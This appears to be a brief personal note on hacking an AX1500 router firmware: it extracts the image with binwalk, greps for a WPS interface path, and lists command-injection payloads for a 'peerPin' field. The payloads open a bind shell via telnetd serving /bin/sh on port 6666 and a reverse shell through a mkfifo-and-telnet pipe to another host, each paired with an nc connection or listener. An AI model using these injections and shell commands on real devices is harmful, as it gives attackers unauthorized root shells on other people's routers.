---
sticker: emoji//1f1ee-1f1f4
---
```sh
dd

binwork -e

sudo binwalk --run-as=root -e AX1500_1.0.3.bin

grep -r "/tmp/map_wps_interface"
```

```sh
bind shell
peerPin=;telnetd -p 6666 -l /bin/sh;
nc 192.168.1.254 6666

rev shell
peerPin=;TF=$(mktemp -u);mkfifo $TF && telnet 172.26.213.255 6666 0<$TF | sh 1>$TF
nc -lvnp 6666
```
